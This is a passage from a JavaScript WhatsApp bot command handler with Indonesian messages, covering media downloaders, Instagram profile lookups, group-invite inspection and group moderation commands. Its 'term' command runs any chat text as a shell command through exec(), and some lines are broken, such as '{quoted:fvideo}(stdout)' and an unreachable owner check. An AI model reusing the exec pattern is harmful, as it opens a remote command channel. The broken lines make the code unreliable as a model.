			fs.writeFileSync(`./stik/fake.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			if (!isOwner)return reply(mess.only.owner)
	case 'setthumb':
	        if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
          	boij = isQuotedImage || isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
			delb = await hexa.downloadMediaMessage(boij)
			fs.writeFileSync(`./stik/thumb.jpeg`, delb)
			fakestatus('Sukses')
        	} else {
            reply(`Kirim gambar dengan caption ${prefix}sethumb`)
          	}
			break	
			
      case "youtube":
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
        if (!isUrl(args[0]) && !args[0].includes("youtu"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}`
        );
        var b = bv.result.creator_metadata;
        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `*Name channel*: ${b.name}\n📜 *Title*: ${a.title}\n❤️ *Like*: ${a.totalLikes}\n👎 *Dislike*: ${a.totalDislikes}\n🎞️ *Views*: ${a.totalViews}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}ytdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}ytdl ${args[0]}|music`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
	case 'ytmp4':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp4 [linkYt]*`)
			let isLinks2 = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks2) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				ytv(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
				if (Number(filesize) >= 40000) return sendMediaURL(from, thumb, `*YTMP 4!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captionsYtmp4 = `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP4\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captionsYtmp4)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})		
				})
				} catch (err) {
			    reply(mess.error.api)
				}
				break
	case 'emoji':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (!q) return fakegroup('emojinya?')
			qes = args.join(' ')
			emoji.get(`${qes}`).then(emoji => {
			teks = `${emoji.images[4].url}`
    		sendStickerFromUrl(from,`${teks}`)	
    		console.log(teks)
   			})
    		break
	case 'ytmp3':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length === 0) return reply(`Kirim perintah *${prefix}ytmp3 [linkYt]*`)
			let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
			if (!isLinks) return reply(mess.error.Iv)
				try {
				reply(mess.wait)
				yta(args[0])
				.then((res) => {
				const { dl_link, thumb, title, filesizeF, filesize } = res
				axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
				.then((a) => {
			    if (Number(filesize) >= 30000) return sendMediaURL(from, thumb, `*Data Berhasil Didapatkan!*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam mektuk link_`)
				const captions = `*YTMP3*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
				sendMediaURL(from, thumb, captions)
				sendMediaURL(from, dl_link).catch(() => reply(mess.error.api))
				})
				})
				} catch (err) {
				reply(mess.error.api)
				}
				break
    case 'image':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (args.length < 1) return reply('Masukan teks!')
            const gimg = args.join('');
            reply(mess.wait)
            gis(gimg, async (error, result) => {
            n = result
            images = n[Math.floor(Math.random() * n.length)].url
            hexa.sendMessage(from,{url:images},image,{quoted:ftoko})
            });
            break
 	case 'tiktok':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isPremium)return reply(mess.only.premium)
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		console.log(result)
    		const { videonowm, videonowm2, text } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${videonowm2}`)
    		.then(async (a) => {
    		me = `*Title* : ${text}\n*Link* : ${a.data}`
		hexa.sendMessage(from,{url:`${videonowm}`},video,{mimetype:'video/mp4',quoted:ftoko,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break
    case 'tiktokaudio':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isPremium)return reply(mess.only.premium)
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply(mess.Iv)
 		if (!q) return fakegroup('Linknya?')
 		reply(mess.wait)
 		tik.ssstik(`${args[0]}`)
    		.then(result => {
    		const { music,text } = result
		hexa.sendMessage(from,{url:`${music}`},audio,{mimetype:'audio/mp4',filename : `${text}`,quoted:ftoko})
		})
     		.catch(e => console.log(e))
     		break
case "tiktok2": 
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isPremium)return reply(mess.only.premium)
        if(!q) return ('Silahkan ulangi dan tambahkan link tiktok')
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${args[0]}`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        l(
          from,
          `▢ *Nickname*: ${b.username}\n▢ *Like*: ${a.stats.diggCount}\n▢ *Komentar*: ${a.stats.commentCount}\n▢ *Share*: ${a.stats.shareCount}\n▢ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `MP3`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `MP4`,
              },
              type: 1,
            },
          ]
        );
        break  
case "tiktokdl":
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isPremium)return reply(mess.only.premium)
        var gh = body.slice(10)
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break
    case 'brainly':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length < 1) return reply('Pertanyaan apa')
          	brien = args.join(' ')
			brainly(`${brien}`).then(res => {
			teks = '❉───────────────────────❉\n'
			for (let Y of res.data) {
			teks += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n❉──────────────────❉\n`
			}
			hexa.sendMessage(from, teks, text,{quoted:ftoko,detectLinks: false})                        
            })              
			break
    case 'ig':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
        if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.Iv)
        if (!q) return fakegroup('Linknya?')
        reply(mess.wait)
	    igdl(args[0])
	    .then(async(result) => {
            for (let ink of result.url_list)	{
            if (ink.includes('.mp4')){
            const igvdl = await getBuffer(ink)	
	    hexa.sendMessage(from,igvdl,video,{mimetype:'video/mp4',quoted:ftoko,caption:'Nih'})
            } else if (ink.includes('.jpg')){
            const igpdl = await getBuffer(ink)
            hexa.sendMessage(from,igpdl,image,{mimetype:'image/jpeg',quoted:ftoko,caption:'Nih'})
	    }
            }
	    })
	    break
    case 'igstalk':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!q) return fakegroup('Usernamenya?')
            ig.fetchUser(`${args.join(' ')}`).then(Y => {
            console.log(`${args.join(' ')}`)
            ten = `${Y.profile_pic_url_hd}`
            teks = `*ID* : ${Y.profile_id}\n*Username* : ${args.join('')}\n*Full Name* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Followers* : ${Y.followers}\n*Following* : ${Y.following}\n*Private* : ${Y.is_private}\n*Verified* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
            sendMediaURL(from,ten,teks) 
            })      
            break    
    case 'fb':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!q) return reply('Linknya?')
            if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return reply(mess.Iv)
            reply(mess.wait)
            te = args.join(' ')
            fakestatus(mess.wait)
            Fb.getInfo(`${te}`)
            .then(G => {
            ten = `${G.download.sd}`
            tek = `${G.title}`
            sendMediaURL(from,ten,`*Title* : ${tek}\n\n*Link* : ${ten}`)
            })
            break    
	case 'term':
	 if (!isOwner)return reply(mess.only.owner)
			if (!q) return fakegroup(mess.wrongFormat)
			exec(q, (err, stdout) => {
			if (err) return fakegroup(`SELF-BOT:~ ${err}`)
			if (stdout) {
			{quoted:fvideo}(stdout)
			}
			})
		    break 
    case 'join':
     if (!isOwner)return reply(mess.only.owner)
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            hen = args[0]
            if (!q) return fakestatus('Masukan link group')
            var codeInvite = hen.split('https://chat.whatsapp.com/')[1]
            if (!codeInvite) return fakegroup ('pastikan link sudah benar!')
            var response = await hexa.acceptInvite(codeInvite)
            fakestatus('SUKSES')
            } catch {
            fakegroup('LINK ERROR!')
            }
            break
    case'twitter':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if (!isUrl(args[0]) && !args[0].includes('twitter.com')) return reply(mess.Iv)
            if (!q) return fakegroup('Linknya?')
            ten = args[0]
            var res = await twitterGetUrl(`${ten}`)
            .then(g => {
            ren = `${g.download[2].url}`
            sendMediaURL(from,ren,'DONE')
            })
            break
    case 'runtime':
    case 'test':
     case 'hidup':
            run = process.uptime() 
            teks = `${kyun(run)}`
            fakegroup(teks)
            break  
	case 'speed':
	case 'ping':
	 case 'kecepatan':
			const timestamp = speed();
			const latensi = speed() - timestamp
			exec(`neofetch --stdout`, (error, stdout, stderr) => {
			const child = stdout.toString('utf-8')
			const teks = child.replace(/Memory:/, "Ram:")
			const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
			fakegroup(pingnya)
			})
			break  
    case 'totag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply (mess.only.admin)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
        } else if ((isMedia && !mek.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await hexa.downloadAndSaveMediaMessage(encmedia, filename = getRandom)
            value = args.join(" ")
            var group = await hexa.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
            }
            ini_buffer = fs.readFileSync(file)
            hexa.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
          reply(`reply gambar/sticker/audio/video dengan caption ${prefix}totag`)
        }
        break
    case 'tomp4':
     case 'tovid':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            ger = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadAndSaveMediaMessage(ger)
            webp2mp4File(owgi).then(res=>{
            sendMediaURL(from,res.result,'Done')
            })
            }else {
            reply('reply stiker')
            }
            fs.unlinkSync(owgi)
            break
    case 'tourl':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
            if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
            boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
            owgi = await hexa.downloadMediaMessage(boij)
            res = await upload(owgi)
            reply(res)
            } else {
            reply('kirim/reply gambar/video')
            }
            break	
    case 'inspect':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!mek.key.fromMe) return fakestatus('𝙱𝙾𝚃 𝚂𝙴𝙳𝙰𝙽𝙶 𝙳𝙰𝙻𝙼 𝙼𝙾𝙳𝙴 𝚂𝙴𝙻𝙵')
            try {
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
            if (!q) return reply('masukan link wa')
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return reply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await hexa.query({ 
            json: ["query", "invite",net],
            expect200:true })
            let par = `*Id* : ${id}
${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
*Nama Gc* : ${subject}
*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
*Jumlah Member* : ${size}
${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
*Id desc* : ${descId}
${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
           for ( let y of participants) {
             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
             }
             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
             hexa.sendMessage(from,par,text,{quoted:ftoko,contextInfo:{mentionedJid:jids}})
             } catch {
             reply('Link error')
             }
             break
case 'kick2':
case 'hedcot':
 case 'hedshot':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
    if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (entah.length > 1) {
					var mems_ids = []
					for (let ids of entah) {
					mems_ids.push(ids)
					}
					hexa.groupRemove(from, mems_ids)
                           
					} else {
                                
					hexa.groupRemove(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupRemove(from, [entah])
                        
					}
                        
					break
case 'add2':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                        
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                            
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            
					if (entah.length > 1) {
                                
					var mems_ids = []
                                
					for (let ids of entah) {
                                    
					mems_ids.push(ids)
                                
					}
                                
					hexa.groupAdd(from, mems_ids)
                           
					} else {
                                
					hexa.groupAdd(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupAdd(from, [entah])
                        
					}
                        
					break
case 'promote2':
 case 'pm2':
  case 'pm':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                        
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                            
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            
					if (entah.length > 1) {
                                
					var mems_ids = []
                                
					for (let ids of entah) {
                                    
					mems_ids.push(ids)
                                
					}
                                
					hexa.groupMakeAdmin(from, mems_ids)
                           
					} else {
                                
					hexa.groupMakeAdmin(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupMakeAdmin(from, [entah])
                        
					}
                        
					break
case 'demote2':
 case 'dm':
  case 'dm2':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
      if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
                        
					if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
                            
					entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
                            
					if (entah.length > 1) {
                                
					var mems_ids = []
                                
					for (let ids of entah) {
                                    
					mems_ids.push(ids)
                                
					}
                                
					hexa.groupDemoteAdmin(from, mems_ids)
                           
					} else {
                                
					hexa.groupDemoteAdmin(from, [nomor[0]])
                          
					}
                        
					} else {
                           
					entah = mek.message.extendedTextMessage.contextInfo.participant
                            
					hexa.groupDemoteAdmin(from, [entah])
                        
					}
                        
					break

      
case "antilink":
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./lib/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./lib/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

case 'hidetag':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
        if (!mek.key.fromMe) return reply('SELF-BOT')
                var value = body.slice(8)
                var group = await hexa.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map( async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                var options = {
                text: value,
                contextInfo: { mentionedJid: mem },
                quoted: ftroli
                }
                hexa.sendMessage(from, options, text)
               
                break
case 'tag': 					              				          
   case 'mention': 			

					texxt = args.join(' ')
   hexa.sendMessage(from, texxt, text, {
   quoted: mek,
    contextInfo: {
      mentionedJid: hexa.parseMention(texxt)
    }
  })
					break
case 'demote':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Tag target yang ingin di turunkan admin group!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Perintah diterima, menurunkan jadi admin group* :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						hexa.groupDemoteAdmin(from, mentioned)
					} else {
						mentions(`*Perintah diterima, menurunkan* @${mentioned[0].split('@')[0]} *jadi admin group*`, mentioned, true)
						hexa.groupDemoteAdmin(from, mentioned)
					}
					break
			case 'promote':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
     if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('*Tag target yang ingin di jadikan admin group!*')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `*Selamat* 🥳 *Anda naik menjadi admin group* 🎉 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						hexa.groupMakeAdmin(from, mentioned)
					} else {
						mentions(`*Selamat* 🥳 @${mentioned[0].split('@')[0]} *Anda naik menjadi admin group* 🎉`, mentioned, true)
						hexa.groupMakeAdmin(from, mentioned)
					}
					break
case 'kick':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
 if (!mek.key.fromMe) return reply('SELF-BOT')
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('𝗧𝗮𝗴 𝘁𝗮𝗿𝗴𝗲𝘁 ??𝗮𝗻𝗴 𝗶𝗻𝗴𝗶𝗻 𝗱𝗶 𝘁𝗲𝗻𝗱𝗮𝗻𝗴!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = ''
						for (let _ of mentioned) {
							teks += `╭────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 🤭 :\n`
							teks += `@_.split('@')[0]`
						}
						mentions(teks, mentioned, true)
						hexa.groupRemove(from, mentioned)
					} else {
						mentions(`╭────────────────⊱
║> *_ASEK DAPAT JATAH OPEN BO.KICK_*
╰────────────────⊱
 @${mentioned[0].split('@')[0]} 🤭`, mentioned, true)
						hexa.groupRemove(from, mentioned)
					}
					break
case 'add':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
  if (!mek.key.fromMe) return reply('SELF-BOT')
					if (args.length < 1) return reply('Yang mau di add siapa??')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara Gan')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						hexa.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break
case 'igvideo':
			case 'ig':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://www.instagram.com/p/CQpUpGvAhWq/?utm_source=ig_web_copy_link`) 
			linkkkkk = body.slice(9) 
			try {
			const yes = await hx.igdl(q) 
			console.log(yes)
			haloo = `${yes[0].downloadUrl}`
			gayyyyy = await getBuffer(haloo) 
			hexa.sendMessage(from, gayyyyy, video, {mimetype: 'video/mp4', filename: `PythonBot.mp4`, quoted: ftroli, caption: 'Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_'}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender) 
			break
			case 'igaudio':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://www.instagram.com/p/CQpUpGvAhWq/?utm_source=ig_web_copy_link`) 
			try {
			const yes = await hx.igdl(q) 
			console.log(yes)
			himya = `${yes[0].downloadUrl}`
			knom = await getBuffer(himya) 
			hexa.sendMessage(from, knom, audio, {mimetype: 'audio/mp4', filename: `HansBot.mp3`, quoted: ftroli}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender) 
			break
			case 'igimage':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://www.instagram.com/p/CQXahxwlK_A/?utm_medium=copy_link`)
			try {
			const yes = await hx.igdl(q) 
			console.log(yes)
			haloo = `${yes[0].downloadUrl}`
			oper = await getBuffer(haloo) 
			captiony = `Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_`
			hexa.sendMessage(from, oper, image, {quoted: ftroli, caption: captiony}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
			case 'igstory':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
			if (args.length == 0) return reply(`Contoh : ${prefix + command} jokowi`) 
			jokooooooo = body.slice(9) 
			try {
			const yes = await hx.igstory(`${jokooooooo}`) 
			jokowi = `${yes[0].downloadUrl}`
			reply(jokowi) 
			buper = await getBuffer(jokowi) 
			ini_yyyy = `Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_`
			hexa.sendMessage(from, buper, video, {mimetype: 'video/mp4', filename: `PythonBot.mp4`, quoted: ftroli, caption: ini_yyyy}) 
			console.log(yes)
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
			case 'tiktokvideo':
			case 'ttvideo':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isPremium)return reply(mess.only.premium)
			if (args.length == 0) return reply(`Contoh : ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`) 
			try {
			const yes = await hx.ttdownloader(q) 
			console.log(yes)
			Ini_video = await getBuffer(yes.nowm) 
			yyyy = `Support *𝙿𝚈𝚃𝙷𝙾𝙽 𝙱𝙾𝚃菲诺* Dengan Follow :\nInstagram.com/finoooooo_`
			hexa.sendMessage(from, Ini_video, video, {mimetype: 'video/mp4', filename: `PythonBot.mp4`, quoted: ftroli, caption: yyyy}) 
			} catch (error) {
			console.log(error)
			}
			await limitAdd(sender)
			break
case 'd':
case 'del':
case 'delete':
if (isBanned)return reply(mess.only.banned)
if (!isRegister)return reply(mess.only.register)
if (!isGroupAdmins)return reply(mess.only.admin)
  if (!mek.key.fromMe) return reply('SELF-BOT')
